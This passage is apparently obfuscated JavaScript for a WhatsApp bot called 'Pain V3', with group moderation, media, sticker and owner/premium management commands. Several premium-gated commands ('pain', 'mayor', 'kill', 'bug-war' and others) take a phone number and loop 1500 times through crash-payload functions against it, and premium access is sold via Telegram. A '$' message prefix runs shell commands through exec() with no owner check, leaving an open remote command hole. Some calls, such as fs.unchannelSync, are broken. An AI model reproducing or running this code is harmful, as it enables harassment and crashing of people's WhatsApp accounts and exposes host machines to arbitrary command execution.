‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let v234 of v32) {
            v233 += "⊝ @" + v234.id.split("@")[0] + "\n";
          }
          mayor.sendMessage(m.chat, {
            text: v233,
            mentions: v32.map(p98 => p98.id)
          }, {
            quoted: m
          });
        }
        break;
      case "kick":
        {
        
          if (!v24) {
            return vF6(global.onlygroup);
          }
          if (!v39 && !v46) {
            return vF6(global.onlyadmin);
          }
          if (!v36) {
            return vF6(global.noadmin);
          }
          let v235 = m.quoted ? m.quoted.sender : v23.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await mayor.groupParticipantsUpdate(m.chat, [v235], "remove").then(p99 => vF6(util.format(p99))).catch(p100 => vF6(util.format(p100)));
        }
        break
                case 'animeku': {
                
                        const dir = [
                            'https://telegra.ph/file/0d4fb93951c620aacb229.mp4',
                            'https://g.top4top.io/m_2391c90iu1.mp4',
                            'https://h.top4top.io/m_2391mfvy22.mp4',
                            'https://i.top4top.io/m_2391iwmee3.mp4',
                            'https://j.top4top.io/m_23915x5204.mp4',
                            'https://l.top4top.io/m_2391e795x5.mp4',
                            'https://a.top4top.io/m_2391jcee66.mp4',
                            'https://b.top4top.io/m_2391ho0bz7.mp4',
                            'https://c.top4top.io/m_23910hulw8.mp4',
                            'https://d.top4top.io/m_2391dj01a9.mp4',
                            'https://e.top4top.io/m_23912fdr210.mp4',
                            'https://a.top4top.io/m_23911dhqx1.mp4',
                            'https://b.top4top.io/m_2391wwr402.mp4',
                            'https://c.top4top.io/m_2391vfkp63.mp4',
                            'https://d.top4top.io/m_2391b7cey4.mp4',
                            'https://e.top4top.io/m_2391fxdc85.mp4',
                            'https://telegra.ph/file/c3deeb5b0b7f7738a95ad.mp4',
                            'https://telegra.ph/file/7ca9eef850f5edc53f7f2.mp4',
                            'https://telegra.ph/file/44f73812ae0c19f097264.mp4',
                            'https://telegra.ph/file/10399f910bb90de8a6c53.mp4',
                            'https://telegra.ph/file/f7b440b02e742d1d4bed6.mp4',
                            'https://telegra.ph/file/3571f86c9c8843f48ce03.mp4',
                            'https://telegra.ph/file/c0b4e700e2d696f6ae448.mp4',
                            'https://telegra.ph/file/c0b4e700e2d696f6ae448.mp4',
                            'https://telegra.ph/file/fbfa5ac6baca454de22ad.mp4',
                            'https://telegra.ph/file/899cb30e29de1f0692ea1.mp4',
                            'https://telegra.ph/file/30e226e2d30e51bda678f.mp4',
                            'https://telegra.ph/file/4b20016e2f4ff925470fea.mp4',
                            'https://telegra.ph/file/d48fde63f91f9aa585716.mp4',
                            'https://telegra.ph/file/3a1f2afb1172b4606cd50.mp4',
                            'https://telegra.ph/file/fe7de67cadcddf80e4f23.mp4',
                            'https://telegra.ph/file/f4eabe96d994b28b7020d.mp4',
                            'https://telegra.ph/file/f8adc8f3af8ce6f80254b.mp4',
                            'https://telegra.ph/file/909a4beb3be92dae9e8ef.mp4',
                            'https://telegra.ph/file/57dff983fe52d49cf9e11.mp4',
                            'https://telegra.ph/file/70ed984ecf1382e0e74ce.mp4',
                            'https://telegra.ph/file/a922d3d0214e7b95dfb89.mp4',
                            'https://telegra.ph/file/ff7a0e8598bfd47898932.mp4',
                            'https://telegra.ph/file/c992c64d4bb59df46f06e.mp4',
                            'https://telegra.ph/file/137346459c02371cf5de9.mp4',
                            'https://telegra.ph/file/2ae60a3fc1509f779cba0.mp4',
                            'https://telegra.ph/file/223ac432cbca27313c59c.mp4',
                            'https://telegra.ph/file/6411bbcedc5da320b8656.mp4',
                            'https://telegra.ph/file/33a005837185d86435a26.mp4',
                            'https://telegra.ph/file/3b5cf36d1fc154ee36345.mp4',
                            'https://telegra.ph/file/c5606fb2547f4c8268f1bb.mp4',
                            'https://telegra.ph/file/a91ba184bd2faedf2ca93.mp4',
                            'https://telegra.ph/file/aemayor466be77f72498981.mp4',
                            'https://telegra.ph/file/a38ff1a80c53fb374af90.mp4',
                            'https://telegra.ph/file/607217019e1e5952920c1.mp4',
                            'https://telegra.ph/file/8a98532caa714b28acce1.mp4',
                            'https://telegra.ph/file/9eb4be5e79b7e71bfecc5.mp4',
                            'https://telegra.ph/file/10bbd3972f7b75a8b2ef6.mp4',
                            'https://telegra.ph/file/3fae1c6aacaba812ea651.mp4',
                            'https://telegra.ph/file/68378ab14e55b8a4113c2.mp4',
                            'https://telegra.ph/file/9cb140f6f74012cce30c7.mp4',
                            'https://telegra.ph/file/17a3d58921c2754cf86ef.mp4',
                            'https://telegra.ph/file/3ac2c8447b8915a879e7a.mp4',
                            'https://telegra.ph/file/269cd09dcf42f8bd3a6f9.mp4',
                            'https://telegra.ph/file/d2e59e56cfdaac79ca7f8.mp4',
                            'https://telegra.ph/file/504ac80844f99a8e3fc54.mp4',
                            'https://telegra.ph/file/dd2b8fba0010f539085d1.mp4',
                            'https://telegra.ph/file/af9726aad0dce10dc4529.mp4',
                            'https://telegra.ph/file/c693724dba3bb96bb6c70.mp4',
                            'https://telegra.ph/file/5b91438135d01c11e7c92.mp4',
                            'https://telegra.ph/file/d2a468ff7cd4c29dcdb4a.mp4',
                            'https://telegra.ph/file/9cc245954979317b3484c.mp4',
                            'https://telegra.ph/file/cde12f0fd2c73ab8eb933.mp4',
                            'https://telegra.ph/file/ab58119a87c7f2c2367dc.mp4',
                            'https://telegra.ph/file/9146e2d5490c1b01c6e87.mp4',
                            'https://telegra.ph/file/09c9e72d3e0d44175c304.mp4',
                            'https://telegra.ph/file/2f01ddd037c40477ed07f.mp4',
                            'https://telegra.ph/file/be72f95d92490f0a1db3b.mp4',
                            'https://telegra.ph/file/d1464f070543fb3aaeaee.mp4',
                            'https://telegra.ph/file/99f02aa82825f1bf61e9a.mp4',
                            'https://telegra.ph/file/d540762b1d4f9e767357d.mp4',
                            'https://telegra.ph/file/98d09d227e8552d4e2bea.mp4',
                            'https://telegra.ph/file/4a9dc4ba09484791dfa9a.mp4',
                            'https://telegra.ph/file/91d8701c2783775637125.mp4',
                        ]
                        await mayor.sendMessage(m.chat, {
                            video: {
                                url: dir[Math.floor(Math.random() * dir.length)]
                            }, caption: `*_</> Done. video anime by pain v3_*`
                        }, {
                            quoted: m
                        })
                    }
                    break;
            case "sound1":
            case "sound2":
            case "sound3":
            case "sound4":
            case "sound5":
            case "sound6":
            case "sound7":
            case "sound8":
            case "sound9":
            case "sound10":
            case "sound11":
            case "sound12":
            case "sound13":
            case "sound14":
            case "sound15":
            case "sound16":
            case "sound17":
            case "sound18":
            case "sound19":
            case "sound20":
            case "sound21":
            case "sound22":
            case "sound23":
            case "sound24":
            case "sound25":
            case "sound26":
            case "sound27":
            case "sound28":
            case "sound29":
            case "sound30":
            case "sound31":
            case "sound32":
            case "sound33":
            case "sound34":
            case "sound35":
            case "sound36":
            case "sound37":
            case "sound38":
            case "sound39":
            case "sound40":
            case "sound41":
            case "sound42":
            case "sound43":
            case "sound44":
            case "sound45":
            case "sound46":
            case "sound47":
            case "sound48":
            case "sound49":
            case "sound50":
            case "sound51":
            case "sound52":
            case "sound53":
            case "sound54":
            case "sound55":
            case "sound56":
            case "sound57":
            case "sound58":
            case "sound59":
            case "sound60":
            case "sound61":
            case "sound62":
            case "sound63":
            case "sound64":
            case "sound65":
            case "sound66":
            case "sound67":
            case "sound68":
            case "sound69":
            case "sound70":
            case "sound71":
            case "sound72":
            case "sound73":
            case "sound74":
            case "sound75":
            case "sound76":
            case "sound77":
            case "sound78":
            case "sound79":
            case "sound80":
            case "sound81":
            case "sound82":
            case "sound83":
            case "sound84":
            case "sound85":
            case "sound86":
            case "sound87":
            case "sound88":
            case "sound89":
            case "sound90":
            case "sound91":
            case "sound92":
            case "sound93":
            case "sound94":
            case "sound95":
            case "sound96":
            case "sound97":
            case "sound98":
            case "sound99":
            case "sound100":
            case "sound101":
            case "sound102":
            case "sound103":
            case "sound104":
            case "sound105":
            case "sound106":
            case "sound107":
            case "sound108":
            case "sound109":
            case "sound110":
            case "sound111":
            case "sound112":
            case "sound113":
            case "sound114":
            case "sound115":
            case "sound116":
            case "sound117":
            case "sound118":
            case "sound119":
            case "sound120":
            case "sound121":
            case "sound122":
            case "sound123":
            case "sound124":
            case "sound125":
            case "sound126":
            case "sound127":
            case "sound128":
            case "sound129":
            case "sound130":
            case "sound131":
            case "sound132":
            case "sound133":
            case "sound134":
            case "sound135":
            case "sound136":
            case "sound137":
            case "sound138":
            case "sound139":
            case "sound140":
            case "sound141":
            case "sound142":
            case "sound143":
            case "sound144":
            case "sound145":
            case "sound146":
            case "sound147":
            case "sound148":
            case "sound149":
            case "sound150":
            case "sound151":
            case "sound152":
            case "sound153":
            case "sound154":
            case "sound155":
            case "sound156":
            case "sound157":
            case "sound158":
            case "sound159":
            case "sound160":
            case "sound161":
            
                XeonBotInc_dev = await getBuffer(
                    `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${v20}.mp3`
                );
                await mayor.sendMessage(
                    m.chat,
                    {
                        audio: XeonBotInc_dev, mimetype: "audio/mp4", ptt: true
                    },
                    {
                        quoted: m
                    }
                );
                    break;
                                case "buypremium":
                                case "buyprem":
                                case "premium":
                                    {
                                    
                                        
                                        let teks = `Hi ðŸ‘‹\nWant to Buy Premium? Just chat with Mayor @MAYOR_HIM on telegram`;
                                        await mayor.sendMessage(
                                            m.chat,
                                            {
                                                text: teks,
                                                contextInfo: {
                                                    externalAdReply: {
                                                        showAdAttribution: true,
                                                        title: `${ownername}`,
                                                        body: `${Creator}`,
                                                        thumbnailUrl:
                                                        "https://files.catbox.moe/9570e5.jpg",
                                                        sourceUrl: global.channel,
                                                        mediaType: 1,
                                                        renderLargerThumbnail: true
                                                    }
                                                }
                                            },
                                            {
                                                quoted: m
                                            }
                                        );
                                    }
                                    break
                                    
                                    case 'ai': {
                                    
                                    
                                        if (!v23) return vF6(`Example:  what is your name`);   
                                        try {
                                            let gpt = await (await fetch(`https://apitoxxictechinc.vercel.app/api/chat?question=${text}&apikey=toxxicboy`)).json();
                                            await vF6(gpt.data.response);
                                        } catch (error) {
                                            await vF6('An error occurred, please try again later.');
                                        }
                                        
                                    }

                    break;
                                case "runtime":
                                
                                    
                                    let runtimetext = `*Bot Name* : ${global.ownername}
                                    ┏━━━━━━━━━━━━━━━━━━
                                    ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${pushname}
                                    𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${ownername} Pain Bot Have Been Running For ${runtime(
                                        process.uptime()
                                    )}`;
                                    mayor.sendMessage(
                                        m.chat,
                                        {
                                            text: runtimetext,
                                            contextInfo: {
                                                externalAdReply: {
                                                    showAdAttribution: true,
                                                    title: `${ownername}`,
                                                    body: `FORGET DONATE`,
                                                    thumbnailUrl:
                                                    "https://files.catbox.moe/9570e5.jpg",
                                                    sourceUrl: global.channel,
                                                    mediaType: 1,
                                                    renderLargerThumbnail: true
                                                }
                                            }
                                        },
                                        {
                                            quoted: m
                                        }
                                    );
        break;
      case "demote":
        {
        
          if (!v45) {
            return vF6(global.onlyprem);
          }
          if (!v24) {
            return vF6(global.onlygroup);
          }
          if (!v39 && !v46) {
            return vF6(global.onlyadmin);
          }
          if (!v36) {
            return vF6(global.noadmin);
          }
          let v236 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : v23.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await mayor.groupParticipantsUpdate(m.chat, [v236], "demote").then(p101 => vF6(util.format(p101))).catch(p102 => vF6(util.format(p102)));
        }
        break;
      case "promote":
        {
        
          if (!v24) {
            return vF6(global.onlygroup);
          }
          if (!v39 && !v46) {
            return vF6(global.onlyadmin);
          }
          if (!v36) {
            return vF6(global.noadmin);
          }
          let v237 = m.quoted ? m.quoted.sender : v23.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await mayor.groupParticipantsUpdate(m.chat, [v237], "add").then(p103 => vF6(util.format(p103))).catch(p104 => vF6(util.format(p104)));
        }
        break;
      case "sticker":
      case "stiker":
      case "s":
        {
        
          if (!v46) {
            return vF6(global.onlyown);
          }
          if (!v15) {
            return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*𝘒𝘪𝘳𝘪𝘮/𝘙𝘦𝘱𝘭𝘺 𝘎𝘢𝘮𝘣𝘢𝘳/𝘝𝘪𝘥𝘦𝘰/𝘎𝘪𝘧 𝘥𝘦𝘯𝘨𝘢𝘯 𝘤𝘢𝘱𝘵𝘪𝘰𝘯 " + (v18 + v20) + "*");
          }
          if (/image/.test(v22)) {
            let v238 = await v15.download();
            const v239 = {
              packname: global.packname,
              author: global.author
            };
            let v240 = await mayor.sendStimg(v14, v238, m, v239);
            await fs.unchannelSync(v240);
          } else if (/video/.test(v22)) {
            if ((v15.msg || v15).seconds > 11) {
              return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*𝘒𝘪𝘳𝘪𝘮/𝘙𝘦𝘱𝘭𝘺 𝘎𝘢𝘮𝘣𝘢𝘳/𝘝𝘪𝘥𝘦𝘰/𝘎𝘪𝘧 𝘥𝘦𝘯𝘨𝘢𝘯 𝘤𝘢𝘱𝘵𝘪𝘰𝘯 " + (v18 + v20) + "*");
            }
            let v241 = await v15.download();
            const v242 = {
              packname: global.packname,
              author: global.author
            };
            let v243 = await mayor.sendStvid(v14, v241, m, v242);
            await fs.unlinkSync(v243);
          } else {
            vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖` \n*𝘒𝘪𝘳𝘪𝘮/𝘙𝘦𝘱𝘭𝘺 𝘎𝘢𝘮𝘣𝘢𝘳/𝘝𝘪𝘥𝘦𝘰/𝘎𝘪𝘧 𝘥𝘦𝘯𝘨𝘢𝘯 𝘤𝘢𝘱𝘵𝘪𝘰𝘯 " + (v18 + v20) + "*");
          }
        }
        break;
      case "painv1":
      case "painv2":
      
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*example " + (v18 + v20) + " 234𝗫𝗫𝗫*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v244 = 0; v244 < 1500; v244++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "mayor":
      
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*example " + (v18 + v20) + " 234𝗫𝗫𝗫*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v245 = 0; v245 < 1500; v245++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "pain":
      
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*example " + (v18 + v20) + " 234𝗫𝗫𝗫*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v246 = 0; v246 < 1500; v246++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f3(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "pain-beta":
      
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*example " + (v18 + v20) + "𝟮𝟯𝟰𝗫𝗫*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v247 = 0; v247 < 1500; v247++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "mera":
      case "kill":
      case "bug-war":
      
        if (!v45) {
          return vF6(global.onlyprem);
        }
        if (!q) {
          return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*example " + (v18 + v20) + " 234𝗫𝗫𝗫*");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(global.bugrespon);
        for (let v248 = 0; v248 < 1500; v248++) {
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
        }
        await vF4(v52);
        break;
      case "addowner":
      case "addown":
      
        if (!v46) {
          return vF6(global.onlyown);
        }
        if (!v21[0]) {
          return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*example " + (v18 + v20) + " 234𝗫𝗫𝗫*");
        }
        dikaown = q.split("|")[0].replace(/[^0-9]/g, "");
        let v249 = await mayor.onWhatsApp(dikaown + "@s.whatsapp.net");
        if (v249.length == 0) {
          return vF6(global.invalid);
        }
        v43.push(dikaown);
        fs.writeFileSync("./database/owner.json", JSON.stringify(v43));
        vF6(`
\`[ 👑 ] 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 \` 
*successful add  _${dikaown}_ *to 𝘥𝘢𝘵𝘢𝘣𝘢𝘴𝘦 𝘰𝘸𝘯𝘦𝘳*`);
        break;
      case "delowner":
      case "delown":
        if (!v46) {
          return vF6(global.onlyown);
        }
        if (!v21[0]) {
          return vF6("`[ 👑 ] 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 𝗜𝗡𝗖 ` \n*example " + (v18 + v20) + " 234𝗫𝗫*");
        }
        dikaown = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = v43.indexOf(ya);
        v43.splice(unp, 1);
        fs.writeFileSync("./database/owner.json", JSON.stringify(v43));
        vF6("`[ 👑 ] 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 ` \n*Successfully _" + dikaown + "_ dele from 𝘰𝘸𝘯𝘦𝘳 database*");
        break;
      case "addpremium":
      case "addprem":
        {
        
          if (!v46) {
            return vF6(global.onlyown);
          }
          if (!v21[0]) {
            return vF6("`[ 👑 ] 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 ` \n*example " + (v18 + v20) + " 234𝗫𝗫𝗖*");
          }
          dikaprem = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v250 = await mayor.onWhatsApp(dikaprem);
          if (v250.length == 0) {
            return vF6(global.invalid);
          }
          v42.push(dikaprem);
          fs.writeFileSync("./database/premium.json", JSON.stringify(v42));
          vF6("`[ 👑 ] 𝔇ᴇᴠ 𝔐ᴀʏᴏʀ 𝔗ᴇᴄʜ™ ` \n*successful add  _" + dikaprem + "_ to 𝘱𝘳𝘦𝘮𝘪𝘶𝘮 𝘥𝘢𝘵𝘢𝘣𝘢𝘴𝘦*");
        }
        break;
      case "delpremium":
      case "delprem":
        {
        
          if (!v46) {
            return vF6(global.onlyown);
          }
          if (!v21[0]) {
            return vF6("`[ 👑 ] 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛` \n*example " + (v18 + v20) + " 234𝗫𝗫𝗫*");
          }
          dikaprem = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v42.indexOf(ya);
          v42.splice(unp, 1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(v42));
          vF6("`[ 👑 ] 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 ` \n*successful delete_" + dikaprem + "_ 𝘱𝘳𝘦𝘮𝘪𝘶𝘮 𝘥𝘢𝘵𝘢𝘣𝘢𝘴𝘦*");
        }
        break;
            case 'getcase':
            
    const getCase = (cases) => {
        return "case" + `'${cases}'` + fs.readFileSync("pain.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break";
    }

    vF6(`${getCase(q)}`);
        break;
      case "self":
        {
        
          if (!v46) {
            return vF6(global.onlyown);
          }
          mayor.public = false;
          vF6(global.succes);
        }
        break;
      case "public":
        {
        
          if (!v46) {
            return vF6(global.onlyown);
          }
          mayor.public = true;
          vF6(global.succes);
        }
        break;
      case "test":
        {
        
          vF6("𝗣𝗔𝗜𝗡-𝗩𝟯 𝘽𝙔 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥");
        }
        break;
      default:
    }
    if (v17.startsWith("$")) {
      exec(v17.slice(2), (p105, p106) => {
        if (p105) {
          return vF6(p105);
        }
        if (p106) {
          return vF6(p106);
        }
      });
    }
    if (v17.startsWith(">")) {
      if (!v46) {
        return vF6(global.onlyown);
      }
      try {
        let v251 = await eval(v17.slice(2));
        if (typeof v251 !== "string") {
          v251 = require("util").inspect(v251);
        }
        await vF6(v251);
      } catch (_0x52dc1e) {
        vF6(String(_0x52dc1e));
      }
    }
  } catch (_0xe92141) {
    console.log(_0xe92141);
    mayor.sendMessage(global.owner + "@s.whatsapp.net", {
      text: "" + util.format(_0xe92141)
    });
  }
};
let v252 = require.resolve(__filename);
fs.watchFile(v252, () => {
  fs.unwatchFile(v252);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[v252];
  require(v252);
});